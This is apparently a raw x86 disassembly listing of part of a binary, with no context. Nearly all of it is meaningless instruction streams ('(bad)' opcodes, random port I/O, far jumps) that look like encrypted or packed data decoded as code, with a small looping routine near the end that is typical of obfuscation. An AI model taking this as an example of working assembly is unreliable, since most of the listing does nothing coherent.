  403a67:	leave  
  403a68:	div    DWORD PTR [edx-0x7f439b6c]
  403a6e:	add    dl,0xd7
  403a71:	idiv   BYTE PTR [eax-0x7b]
  403a74:	mov    ds:0xc4e258a8,al
  403a79:	mov    bl,0x94
  403a7b:	inc    edi
  403a7c:	dec    edi
  403a7d:	dec    ebp
  403a7e:	out    0x71,al
  403a80:	call   0xcfb0cd25
  403a85:	cmp    ah,BYTE PTR [eax+0x3e02e79]
  403a8b:	fcomp  st(3)
  403a8d:	sub    al,0x15
  403a8f:	dec    esp
  403a90:	(bad)  
  403a92:	cmp    edi,DWORD PTR ds:[esi+0x4e644a94]
  403a99:	jno    0x403a96
  403a9b:	mov    edi,0x92a7dc10
  403aa0:	xchg   edi,eax
  403aa1:	jo     0x403aed
  403aa3:	lds    esi,FWORD PTR [ebp+0x77]
  403aa6:	scas   eax,DWORD PTR es:[edi]
  403aa7:	mov    ss,edx
  403aa9:	into   
  403aaa:	cdq    
  403aab:	inc    esp
  403aac:	push   es
  403aad:	add    BYTE PTR [edx-0x69],0xef
  403ab1:	jno    0x403aac
  403ab3:	xchg   edi,eax
  403ab4:	ins    BYTE PTR es:[edi],dx
  403ab5:	inc    esp
  403ab6:	sub    eax,0x2184cec8
  403abb:	and    al,0x2d
  403abd:	cmp    DWORD PTR [edi+0x6e],0x37
  403ac1:	leave  
  403ac2:	hlt    
  403ac3:	xchg   edi,eax
  403ac4:	(bad)  
  403ac6:	jl     0x403aa5
  403ac8:	mov    ah,0x4d
  403aca:	mov    ?,WORD PTR [edi+esi*4-0x3c080dfe]
  403ad1:	cwde   
  403ad2:	push   ss
  403ad3:	pop    ebp
  403ad4:	mov    edi,0x8169d556
  403ad9:	sub    DWORD PTR [edx-0x5f],eax
  403adc:	dec    ebp
  403add:	pop    ecx
  403ade:	aam    0xd2
  403ae0:	(bad)  
  403ae2:	add    ebx,DWORD PTR [ebx]
  403ae4:	mov    dh,0xe
  403ae6:	jl     0x403a82
  403ae8:	pop    ebx
  403ae9:	fistp  WORD PTR [edx-0x29]
  403aec:	sub    eax,0xd1c2d2d
  403af1:	pop    edi
  403af2:	cmp    BYTE PTR [edx-0x42],0xd2
  403af6:	cmp    BYTE PTR [eax+0x445da4d5],ch
  403afc:	sub    ebx,0xffffffd5
  403aff:	pop    edx
  403b00:	test   eax,0xe7cf4c3
  403b05:	je     0x403b78
  403b07:	sbb    eax,0xb25d65cb
  403b0c:	cmp    ch,dh
  403b0e:	xchg   DWORD PTR [eax],ebp
  403b10:	mov    edi,0x544b34b8
  403b15:	adc    al,0x1a
  403b17:	inc    eax
  403b18:	push   ss
  403b19:	inc    eax
  403b1a:	sbb    eax,0x1c74fbb4
  403b1f:	or     BYTE PTR [ebx+0x65bbaec0],cl
  403b25:	imul   ebx,DWORD PTR [edx],0x63
  403b28:	and    DWORD PTR [edi-0x20],esi
  403b2b:	not    BYTE PTR [ecx-0x37f3867d]
  403b31:	stc    
  403b32:	dec    ebp
  403b33:	inc    esp
  403b34:	inc    ecx
  403b35:	mov    al,0xaf
  403b37:	jo     0x403b63
  403b39:	xchg   ecx,eax
  403b3a:	push   eax
  403b3b:	push   esp
  403b3c:	imul   edi,DWORD PTR [edi+0x38f1f0dd],0x49da8ac
  403b46:	jmp    0x9b19:0x9e3aaea9
  403b4d:	cmp    eax,0xa0b8075a
  403b52:	or     dh,BYTE PTR [ecx]
  403b54:	push   edx
  403b55:	pop    esp
  403b56:	sbb    edx,DWORD PTR [esi]
  403b58:	pop    ebx
  403b59:	mov    esp,0x2c45b4ad
  403b5e:	cmp    al,0x67
  403b60:	or     al,0x1a
  403b62:	sub    edi,eax
  403b64:	inc    ebp
  403b65:	or     BYTE PTR [eax],bh
  403b67:	std    
  403b68:	into   
  403b69:	xchg   edi,eax
  403b6a:	mov    WORD PTR [esi],si
  403b6d:	out    0x23,al
  403b6f:	jmp    0xb7b9be47
  403b74:	cmp    al,0x29
  403b76:	push   ss
  403b77:	js     0x403bcb
  403b79:	push   edi
  403b7a:	or     ah,BYTE PTR [ecx+eiz*1]
  403b7d:	dec    esi
  403b7e:	mov    esi,0xc8a826a
  403b83:	in     al,dx
  403b84:	sbb    al,0x51
  403b86:	mov    bh,0x48
  403b88:	not    bh
  403b8a:	xor    esp,DWORD PTR [edx+ebx*1+0x66f632a7]
  403b91:	add    al,0xfb
  403b93:	int3   
  403b94:	sbb    al,BYTE PTR [esi+0x19bf4f9d]
  403b9a:	popf   
  403b9b:	shr    dl,cl
  403b9d:	arpl   WORD PTR ds:0x52c2ebce,ax
  403ba3:	ret    0xdebd
  403ba6:	mov    ah,0xe1
  403ba8:	sub    DWORD PTR [ebx],0x5b
  403bab:	clc    
  403bac:	xor    BYTE PTR [esi+0x7],al
  403baf:	jge    0x403bd2
  403bb1:	sbb    BYTE PTR [eax+0x5fae6c20],ah
  403bb7:	call   0x7ca5bde6
  403bbc:	mov    bl,0xe6
  403bbe:	scas   al,BYTE PTR es:[edi]
  403bbf:	adc    al,0xe3
  403bc1:	pop    esp
  403bc2:	dec    ebx
  403bc3:	mov    ss,esp
  403bc5:	cli    
  403bc6:	inc    esi
  403bc7:	out    dx,al
  403bc8:	mul    BYTE PTR [ebx-0x1adf69f2]
  403bce:	fldcw  WORD PTR [ecx]
  403bd0:	jle    0x403bbf
  403bd2:	xor    ch,dl
  403bd4:	add    dl,dl
  403bd6:	gs mov bl,0x95
  403bd9:	rcr    BYTE PTR [ebx+0x30],0x34
  403bdd:	ins    BYTE PTR es:[edi],dx
  403bde:	inc    ebx
  403bdf:	test   esi,0xb7128fef
  403be5:	fs inc ebp
  403be7:	pop    ds
  403be8:	push   0x1e
  403bea:	cmp    BYTE PTR [esi-0x25e773e2],dl
  403bf0:	retf   
  403bf1:	xor    eax,0x72f958be
  403bf6:	inc    ebp
  403bf7:	push   edi
  403bf8:	or     DWORD PTR [esi],0xffffffbe
  403bfb:	mov    ch,0x37
  403bfd:	cld    
  403bfe:	out    dx,eax
  403bff:	xchg   DWORD PTR [edx+0x66],ebp
  403c02:	xor    eax,0xec0d26f7
  403c07:	in     eax,dx
  403c08:	mov    eax,0x97840f2c
  403c0d:	add    eax,0x45c70000
  403c12:	call   0x74639a6
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0xd5dcf48b
  403c29:	push   ebp
  403c2a:	aaa    
  403c2b:	pop    ds
  403c2c:	inc    edx
  403c2d:	push   ds
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403be3
  403c35:	mov    al,ds:0x559e1685
  403c3a:	xchg   DWORD PTR [esi-0x35ee69d4],esp
  403c40:	ins    DWORD PTR es:[edi],dx
  403c41:	(bad)  [ebx+edi*1+0x28]
  403c45:	das    
  403c46:	pop    es
  403c47:	fsubr  st,st(0)
  403c49:	sbb    BYTE PTR [ecx+0x71cc7011],0x20
  403c50:	stos   DWORD PTR es:[edi],eax
  403c51:	inc    ecx
  403c52:	lods   eax,DWORD PTR ds:[esi]
  403c53:	sbb    eax,0xc2c15321
  403c58:	pop    ecx
  403c59:	inc    edi
  403c5a:	aaa    
  403c5b:	adc    cl,BYTE PTR [edx]
  403c5d:	mov    dl,0xfe
  403c5f:	fstp   TBYTE PTR [eax]
  403c61:	arpl   WORD PTR [esi+0x368ad514],bp
  403c67:	aad    0xb0
  403c69:	das    
  403c6a:	std    
  403c6b:	ss in  al,0x49
  403c6e:	ficom  DWORD PTR [ebx+0x7]
  403c71:	and    dl,BYTE PTR [ebx]
  403c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c74:	jno    0x403c4d
  403c76:	inc    esi
  403c77:	xor    al,0xf
  403c79:	mov    eax,ds:0x7db51de8
  403c7e:	(bad)  
  403c80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c81:	push   edx
  403c82:	fist   WORD PTR ds:0x47272a35
  403c88:	js     0x403c33
  403c8a:	stc    
  403c8b:	pop    esp
  403c8c:	lock ss in eax,dx
  403c8f:	mov    bl,0x4f
  403c91:	lock push eax
  403c93:	inc    ebx
  403c94:	jbe    0x403c4c
  403c96:	out    0x39,al
  403c98:	ret    0xda1e
  403c9b:	and    bl,BYTE PTR [esi+0x3558caa3]
  403ca1:	int3   
  403ca2:	test   BYTE PTR [ecx],dh
  403ca4:	add    edx,ecx
  403ca6:	idiv   BYTE PTR [edi+0x57]
  403ca9:	inc    edx
  403caa:	sub    BYTE PTR [edx-0x7a],cl
  403cad:	pop    ebp
  403cae:	or     eax,0x7c70ffe7
  403cb3:	out    dx,al
  403cb4:	ret    
  403cb5:	mov    ds:0xc939eade,al
  403cba:	inc    edi
  403cbb:	xor    ebx,ecx
  403cbd:	popa   
  403cbe:	and    edx,0xa932865f
  403cc4:	fcomp  DWORD PTR [ebx-0x1]
  403cc7:	leave  
  403cc8:	mov    edx,0x4ce938fa
  403ccd:	lods   al,BYTE PTR ds:[esi]
  403cce:	pop    ss
  403ccf:	xor    dh,0x75
  403cd2:	(bad)  
  403cd3:	icebp  
  403cd4:	cld    
  403cd5:	das    
  403cd6:	not    DWORD PTR [edi]
  403cd8:	adc    eax,0x837f23ce
  403cdd:	adc    eax,0xb6e7b0e2
  403ce2:	jno    0x403c9f
  403ce4:	push   ebx
  403ce5:	jno    0x403d3a
  403ce7:	sbb    al,0xf2
  403ce9:	pusha  
  403cea:	or     cl,bl
  403cec:	fist   DWORD PTR [esp+ebp*1-0x3abdad7]
  403cf3:	test   BYTE PTR [edx+0x5c],0xc5
  403cf7:	lods   al,BYTE PTR ds:[esi]
  403cf8:	hlt    
  403cf9:	jbe    0x403d75
  403cfb:	fidivr DWORD PTR [edx]
  403cfd:	or     al,0x95
  403cff:	jne    0x403d58
  403d01:	or     DWORD PTR fs:[edi+eiz*1+0x6c],ecx
  403d06:	jb     0x403d80
  403d08:	test   DWORD PTR [ecx],0xc1ac7e45
  403d0e:	mov    eax,ds:0x75fb05af
  403d13:	and    dl,BYTE PTR [ecx-0x5ca7adac]
  403d19:	js     0x403cb8
  403d1b:	push   0xb3cb5308
  403d20:	lds    ecx,FWORD PTR [ebp-0xde7c83c]
  403d26:	xchg   esp,eax
  403d27:	xor    eax,0x86b32257
  403d2c:	jp     0x403d52
  403d2e:	mov    ax,0xdc39
  403d32:	popa   
  403d33:	cmc    
  403d34:	shl    BYTE PTR [edx],cl
  403d36:	sub    al,0x8
  403d38:	cmp    bh,BYTE PTR [edx+0x137fd92a]
  403d3e:	pop    esi
  403d3f:	inc    ebp
  403d40:	jge    0x403dac
  403d42:	repnz (bad) 
  403d44:	cmp    al,0xdf
  403d46:	fs (bad) 
  403d48:	push   cs
  403d49:	jl     0x403db3
  403d4b:	cmp    ch,cl
  403d4d:	test   DWORD PTR [ebx-0x30e8b178],edi
  403d53:	inc    ecx
  403d54:	sbb    bh,ch
  403d56:	jb     0x403d60
  403d58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d5a:	loope  0x403d81
  403d5c:	rcr    DWORD PTR [ecx],1
  403d5e:	pop    edi
  403d5f:	xor    eax,0x351e2a4a
  403d64:	push   ss
  403d65:	xchg   esi,eax
  403d66:	jle    0x403cf4
  403d68:	retf   
  403d69:	push   edi
  403d6a:	push   esp
  403d6b:	sbb    BYTE PTR [ebp+0x1485c09a],al
  403d71:	inc    esi
  403d72:	fs ret 0xcf03
  403d76:	pop    ebx
  403d77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d78:	jmp    0x403d20
  403d7a:	push   ebp
  403d7b:	pop    ebp
  403d7c:	mov    dh,0x7f
  403d7e:	pusha  
  403d7f:	jno    0x403dc5
  403d81:	loopne 0x403d7f
  403d83:	(bad)  
  403d84:	jns    0x403db1
  403d86:	mov    bl,0x19
  403d88:	push   ds
  403d89:	mov    ebp,0xbe6dc990
  403d8e:	in     eax,0x8c
  403d90:	popf   
  403d91:	fucomi st,st(0)
  403d93:	push   0xf89acfee
  403d98:	mov    al,bl
  403d9a:	js     0x403dfc
  403d9c:	mov    DWORD PTR ds:0x35454afa,esi
  403da2:	scas   eax,DWORD PTR es:[edi]
  403da3:	je     0x403e05
  403da5:	pop    ebp
  403da6:	push   esi
  403da7:	dec    esi
  403da8:	icebp  
  403da9:	adc    esi,esi
  403dab:	fist   DWORD PTR [edx-0x20ca5025]
  403db1:	dec    ebx
  403db2:	add    al,0xe3
  403db4:	mov    ds:0x4e30eb04,eax
  403db9:	jmp    0x403d4d
  403dbb:	jne    0x403e1a
  403dbd:	fstp   st(7)
  403dbf:	or     BYTE PTR [esi],dl
  403dc1:	leave  
  403dc2:	(bad)  
  403dc3:	or     al,0xf
  403dc5:	test   BYTE PTR [edx],ch
  403dc7:	or     DWORD PTR ds:0x12e7a253,0xffffffc0
  403dce:	rcr    bh,cl
  403dd0:	add    al,0x7c
  403dd2:	sbb    eax,DWORD PTR [edi+ebx*8+0xffb17d4]
  403dd9:	mov    cl,0x7b
  403ddb:	mov    ebp,0x902e8857
  403de0:	jmp    0x403e3b
  403de2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403de3:	sub    ecx,DWORD PTR [ebp+0x4589e845]
  403de9:	in     al,dx
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi-0x1d8e2571],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403df1
  403e11:	fs adc eax,esi
  403e14:	pop    es
  403e15:	frstor [edx]
  403e17:	push   ss
  403e18:	mov    ch,0x2a
  403e1a:	push   ecx
  403e1b:	mov    dl,ah
  403e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e1e:	loope  0x403e5a
  403e20:	adc    BYTE PTR [edi-0x22],dl
  403e23:	mov    bl,0x56
  403e25:	pop    esp
  403e26:	ret    0x67da
  403e29:	and    ch,BYTE PTR [edx-0x97e8c35]
  403e2f:	jnp    0x403e75
  403e31:	aad    0x96
  403e33:	and    DWORD PTR [eax],0x14d0578e
  403e39:	or     ecx,edx
  403e3b:	daa    
  403e3c:	jae    0x403dc0
  403e3e:	mov    al,ds:0x8f8ccb3f
  403e43:	pushw  ss
  403e45:	sbb    al,0xce
  403e47:	push   ss
  403e48:	pop    ebp
  403e49:	scas   eax,DWORD PTR es:[edi]
  403e4a:	pop    ebx
  403e4b:	pop    ecx
  403e4c:	mov    BYTE PTR [eax+0x39956218],ah
  403e52:	dec    edi
  403e53:	mov    DWORD PTR [esi-0x70203214],eax
  403e59:	shl    BYTE PTR ds:0xf2de33cb,cl
  403e5f:	adc    eax,0x3efe6146
  403e64:	sahf   
  403e65:	daa    
  403e66:	popf   
  403e67:	and    al,0xa3
  403e69:	push   esp
  403e6a:	jb     0x403e42
  403e6c:	fdivr  st,st(2)
  403e6e:	add    BYTE PTR [ebx+0x7acc354e],cl
  403e74:	clc    
  403e75:	jns    0x403e1a
  403e77:	push   edi
  403e78:	popa   
  403e79:	in     al,0x56
  403e7b:	(bad)  
  403e7c:	push   esp
  403e7d:	mov    esi,0xf03a4e01
  403e82:	pop    ebx
  403e83:	xchg   edx,eax
  403e84:	inc    esp
  403e85:	sar    BYTE PTR [eax-0x25aa4a31],cl
  403e8b:	push   edi
  403e8c:	or     ch,al
  403e8e:	imul   eax,DWORD PTR [edx+0x63],0xffffffeb
  403e92:	gs push esp
  403e94:	dec    ebx
  403e95:	in     eax,0x7
  403e97:	(bad)  
  403e98:	div    BYTE PTR [eax]
  403e9a:	mov    esp,0x1a12314
  403e9f:	push   ecx
  403ea0:	push   0x38
  403ea2:	sub    ah,bl
  403ea4:	jl     0x403f22
  403ea6:	add    al,al
  403ea8:	jno    0x403e7f
  403eaa:	inc    ecx
  403eab:	pop    DWORD PTR [ecx+0x41000d23]
  403eb1:	mov    ds:0x9b1c5fe9,eax
  403eb6:	cmp    eax,0x119b4ecc
  403ebb:	adc    al,0xd3
  403ebd:	mov    cl,0x47
  403ebf:	dec    eax
  403ec0:	jno    0x403ed5
  403ec2:	stos   DWORD PTR es:[edi],eax
  403ec3:	dec    eax
  403ec4:	stos   BYTE PTR es:[edi],al
  403ec5:	into   
  403ec6:	adc    eax,0x6f0708e0
  403ecb:	pop    ss
  403ecc:	int3   
  403ecd:	cmp    al,0xfb
  403ecf:	pop    edx
  403ed0:	sub    WORD PTR [ecx+0x2faae163],cx
  403ed7:	add    DWORD PTR [edx],eax
  403ed9:	xor    DWORD PTR [ebx+ecx*1],eax
  403edc:	sub    edi,eax
  403ede:	std    
  403edf:	mov    eax,0x17a739ff
  403ee4:	out    0xf,al
  403ee6:	ror    DWORD PTR [edi+0x11],1
  403ee9:	in     al,dx
  403eea:	jle    0x403e87
  403eec:	rcr    bh,1
  403eee:	lock lods eax,DWORD PTR ds:[esi]
  403ef0:	inc    esi
  403ef1:	sbb    dl,ch
  403ef3:	and    BYTE PTR [edx+edx*4-0x3b82826f],0x95
  403efb:	in     eax,0x59
  403efd:	inc    eax
  403efe:	stos   DWORD PTR es:[edi],eax
  403eff:	mov    BYTE PTR [ecx],0x6e
  403f02:	adc    al,ch
  403f04:	ret    0xea9b
  403f07:	das    
  403f08:	adc    BYTE PTR [edx],bh
  403f0a:	sbb    al,0xc7
  403f0c:	repnz push ecx
  403f0e:	or     DWORD PTR [ecx+0x48],eax
  403f11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f12:	add    BYTE PTR [edi-0x8bd9026],0x43
  403f19:	es into 
  403f1b:	cmp    esp,DWORD PTR [esi+0x3a682a93]
  403f21:	mov    dh,0x8f
  403f23:	mov    BYTE PTR [esi+0x22],bh
  403f26:	pop    edx
  403f27:	and    eax,0xc70b7d02
  403f2c:	pop    esi
  403f2d:	arpl   WORD PTR [eax-0x7b],ax
  403f30:	sub    DWORD PTR ds:[ecx-0x4d],edi
  403f34:	test   al,0x63
  403f36:	jnp    0x403f87
  403f38:	sub    eax,0x41b8350f
  403f3d:	mov    ds:0xe6eb16b4,al
  403f42:	clc    
  403f43:	out    0xad,al
  403f45:	push   ss
  403f46:	out    0x24,eax
  403f48:	call   DWORD PTR [edx]
  403f4a:	leave  
  403f4b:	fst    st(1)
  403f4d:	out    dx,eax
  403f4e:	adc    BYTE PTR [ebp-0x67],0x6
  403f52:	(bad)  
  403f54:	popa   
  403f55:	cli    
  403f56:	sbb    ebp,DWORD PTR [edx-0x4d]
  403f59:	cmp    bl,BYTE PTR [eax+0x11]
  403f5c:	cwde   
  403f5d:	cwde   
  403f5e:	stos   BYTE PTR es:[edi],al
  403f5f:	rcr    BYTE PTR [edi+0x4b69f944],0xf4
  403f66:	clc    
  403f67:	stos   DWORD PTR es:[edi],eax
  403f68:	mov    ?,WORD PTR [edx-0x65446a06]
  403f6e:	stos   BYTE PTR es:[edi],al
  403f6f:	imul   edx,DWORD PTR [ebx],0x49
  403f72:	jl     0x403fdb
  403f74:	(bad)  
  403f75:	enter  0xde3e,0x4c
  403f79:	xchg   edi,eax
  403f7a:	fwait
  403f7b:	adc    cl,BYTE PTR [edi+0x6bd3f657]
  403f81:	inc    DWORD PTR [esi-0x47]
  403f84:	stos   BYTE PTR es:[edi],al
  403f85:	outs   dx,DWORD PTR ds:[esi]
  403f86:	push   esp
  403f87:	das    
  403f88:	cmp    esi,DWORD PTR [ebx]
  403f8a:	add    al,0xdd
  403f8c:	xchg   DWORD PTR [esi+0x4bf92b5b],edx
  403f92:	mov    cl,0x91
  403f94:	mov    bl,0xb8
  403f96:	lods   al,BYTE PTR ds:[esi]
  403f97:	imul   edi,DWORD PTR [ebp+0x66],0xfffffffc
  403f9b:	hlt    
  403f9c:	stc    
  403f9d:	xlat   BYTE PTR ds:[ebx]
  403f9e:	sub    BYTE PTR [ebp+edx*8+0xd],dh
  403fa2:	fld    TBYTE PTR [ebx]
  403fa4:	std    
  403fa5:	mov    bl,0xd5
  403fa7:	add    edx,DWORD PTR [edi]
  403fa9:	mov    dl,0x3
  403fab:	shl    BYTE PTR [edi+0x2f34566b],0xd8
  403fb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fb3:	dec    ecx
  403fb4:	pop    edx
  403fb5:	and    al,0x95
  403fb7:	mov    edi,0xb0f8ec2c
  403fbc:	loop   0x404013
  403fbe:	rol    cl,0x8b
  403fc1:	inc    ebp
  403fc2:	lock mov edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	out    0xed,eax
  403fdb:	xchg   ecx,eax
  403fdc:	xor    BYTE PTR [edx],ah
  403fde:	sbb    bh,BYTE PTR [esi+0x7e]
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x40403f
  403fe6:	mul    BYTE PTR [eax-0x1d94ee97]
  403fec:	call   0x872d:0xdec27db1
  403ff3:	cld    
  403ff4:	xor    eax,DWORD PTR [edi-0x35]
  403ff7:	popa   
  403ff8:	jecxz  0x404006
  403ffa:	pusha  
  403ffb:	(bad)  
  403ffe:	sub    al,0xf2
  404000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404002:	ret    0x8be9
  404005:	popf   
  404006:	loope  0x404054
  404008:	sub    dh,ch
  40400a:	retf   0xaee2
  40400d:	pop    ebp
  40400e:	scas   al,BYTE PTR es:[edi]
  40400f:	xor    ah,BYTE PTR [eax]
  404011:	cld    
  404012:	pop    edi
  404013:	mov    ds:0x517b3a56,al
  404018:	sbb    BYTE PTR [esi-0x331965b1],0xc5
  40401f:	mov    cl,0x34
  404021:	inc    edx
  404022:	dec    edi
  404023:	inc    ebx
  404024:	jbe    0x404089
  404026:	mov    DWORD PTR [di-0x5050],esp
  40402b:	and    edx,ecx
  40402d:	test   DWORD PTR [edi+ebx*1-0xa],edx
  404031:	dec    edx
  404032:	jp     0x404087
  404034:	lea    ebx,[eax+0x3c9e5915]
  40403a:	aaa    
  40403b:	jb     0x40407d
  40403d:	adc    ch,BYTE PTR [ebx]
  40403f:	pop    ebp
  404040:	or     ecx,esp
  404042:	inc    ebp
  404044:	xor    eax,0xb211eb24
  404049:	pop    ebp
  40404a:	xchg   esp,eax
  40404b:	out    0xa,eax
  40404d:	inc    ebp
  40404e:	cmp    al,0xcc
  404050:	mov    ecx,0xa4938688
  404055:	xchg   edx,eax
  404056:	test   al,0xd8
  404058:	bound  edx,QWORD PTR [ebx+0x2d]
  40405b:	add    DWORD PTR [edi+0x52e8eb29],eax
  404061:	xor    BYTE PTR [edi-0x50],bl
  404064:	das    
  404065:	cmp    al,0xb7
  404067:	fwait
  404068:	icebp  
  404069:	add    eax,0x7a
  40406c:	shl    DWORD PTR [esi],1
  40406e:	add    ch,BYTE PTR [ecx+0x76be97c6]
  404074:	faddp  st(2),st
  404076:	in     al,dx
  404077:	push   ds
  404078:	cmp    bl,BYTE PTR [edi+eiz*1+0x30]
  40407c:	jo     0x404039
  40407e:	xchg   edx,eax
  40407f:	mov    al,0x82
  404081:	(bad)  
  404082:	dec    edx
  404083:	mov    ebx,gs
  404085:	retf   
  404086:	mov    al,ds:0x25a0befe
  40408b:	fnstcw WORD PTR [esi]
  40408d:	ja     0x4040fa
  40408f:	cs sahf 
  404091:	sar    BYTE PTR [ebp+0x1a],0xb9
  404095:	mov    ebp,0x4f19a0cb
  40409a:	mov    dh,0x9b
  40409c:	ficomp DWORD PTR [eax-0x6a57ee5b]
  4040a2:	(bad)
  4040a5:	pop    ebp
  4040a6:	cmc    
  4040a7:	add    esi,eax
  4040a9:	push   edi
  4040aa:	rol    BYTE PTR [ecx*2-0x658ddb69],1
  4040b1:	popf   
  4040b2:	mov    ch,0x74
  4040b4:	jle    0x40407c
  4040b6:	mov    edx,0xf8927a45
  4040bb:	jmp    0x9dbc7b40
  4040c0:	cmp    dl,bl
  4040c2:	cmp    eax,0x50e3ff72
  4040c7:	rcr    ebx,cl
  4040c9:	daa    
  4040ca:	and    DWORD PTR [edx+edx*8+0x4a],ecx
  4040ce:	sbb    DWORD PTR [esi+0xe],ebx
  4040d1:	in     eax,dx
  4040d2:	rol    edx,cl
  4040d4:	adc    edi,DWORD PTR [ebx+ebp*1-0x4c85d927]
  4040db:	or     edx,DWORD PTR [ebp+0x24]
  4040de:	pop    ebp
  4040df:	shl    BYTE PTR [ebx-0x4918f267],0x83
  4040e6:	das    
  4040e7:	(bad)  
  4040e8:	and    cl,BYTE PTR [edi]
  4040ea:	and    BYTE PTR [esi+ebp*1+0x6a5065eb],0x5c
  4040f2:	cmp    al,0xa1
  4040f4:	stc    
  4040f5:	add    al,0xd7
  4040f7:	test   esi,edi
  4040f9:	inc    esi
  4040fa:	stos   BYTE PTR es:[edi],al
  4040fb:	ror    esp,cl
  4040fd:	popf   
  4040fe:	stc    
  4040ff:	in     eax,0x4b
  404101:	cdq    
  404102:	in     eax,dx
  404103:	push   0xffffff87
  404105:	aam    0x6b
  404107:	fbstp  TBYTE PTR [esi-0x7f]
  40410a:	xlat   BYTE PTR ds:[ebx]
  40410b:	push   edx
  40410c:	pusha  
  40410d:	rol    DWORD PTR [eax+0x6583d40],0xa8
  404114:	(bad)  
  404115:	cs arpl WORD PTR gs:[ebx-0x33],si
  40411a:	cmp    cl,BYTE PTR [edx-0x5ee0c63d]
  404120:	mov    eax,ds:0xa9ae1403
  404125:	jg     0x40410d
  404127:	aad    0x39
  404129:	mov    dl,0xf6
  40412b:	inc    esi
  40412c:	dec    esi
  40412d:	ficomp DWORD PTR [ecx]
  40412f:	rcr    BYTE PTR [ebp+0x6af1c286],0x8a
  404136:	(bad)
  404139:	pop    es
  40413a:	imul   DWORD PTR [edi]
  40413c:	adc    al,0xf7
  40413e:	mov    eax,0xb50c1e59
  404143:	cmc    
  404144:	xchg   ebp,eax
  404145:	sti    
  404146:	mov    bh,0xc6
  404148:	ret    
  404149:	sbb    al,0x8e
  40414b:	mov    ds:0x58ea02eb,al
  404150:	loope  0x404113
  404152:	(bad)  
  404153:	icebp  
  404154:	(bad)  
  404156:	inc    eax
  404157:	test   DWORD PTR [esi+0xc],eax
  40415a:	xchg   esi,eax
  40415b:	es dec eax
  40415d:	sti    
  40415e:	in     al,0xc5
  404160:	mov    edx,0x3ac350f
  404165:	jno    0x4041d8
  404167:	mov    DWORD PTR [esi-0x34],ebp
  40416a:	das    
  40416b:	add    DWORD PTR [edi+ebx*4-0xc],esi
  40416f:	add    dl,BYTE PTR [edx-0x66c3de02]
  404175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404176:	dec    esi
  404177:	mov    ecx,0xadeb3fdc
  40417c:	push   ebx
  40417d:	out    dx,al
  40417e:	or     al,0xfd
  404180:	jp     0x40411f
  404182:	les    edx,FWORD PTR [esi]
  404184:	xlat   BYTE PTR ds:[ebx]
  404185:	add    ebx,DWORD PTR [esi]
  404187:	push   edi
  404188:	add    eax,0x6f48ab07
  40418d:	inc    esi
  40418e:	mov    ebx,0xa2affd62
  404193:	in     al,0x3f
  404195:	lea    eax,[eax+edx*1+0x32729b]
  40419c:	mov    DWORD PTR [ebp+0x8],eax
  40419f:	inc    DWORD PTR [ebp+0xc]
  4041a2:	jmp    0x403a0a
  4041a7:	mov    eax,DWORD PTR [ebp-0x10]
  4041aa:	xor    eax,ecx
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	xchg   esp,eax
  4041d6:	addr16 xchg edx,eax
  4041d8:	cwde   
  4041d9:	push   edx
  4041da:	sbb    edi,DWORD PTR [esi+0x7e]
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x4041f1
  4041e2:	mov    esi,0xb944f89e
  4041e7:	ins    BYTE PTR es:[edi],dx
  4041e8:	mov    ?,WORD PTR [edx]
  4041ea:	test   DWORD PTR [edx],ecx
  4041ec:	mov    ds:0x3bb14617,al
  4041f1:	mov    ah,0xca
  4041f3:	jno    0x40424a
  4041f5:	push   cs
  4041f6:	inc    ebp
  4041f7:	dec    edi
  4041f8:	push   cs
  4041f9:	loop   0x4041e1
  4041fb:	push   es
  4041fc:	fdiv   DWORD PTR [eax]
  4041fe:	in     al,0x47
  404200:	ror    DWORD PTR [ebx+0x2ce5ffb1],0x0
  404207:	pushf  
  404208:	mov    cl,0x3
  40420a:	bound  esp,QWORD PTR [edx]
  40420c:	jbe    0x404279
  40420e:	test   eax,0x4e398504
  404213:	mov    dh,0x6f
  404215:	stos   BYTE PTR es:[edi],al
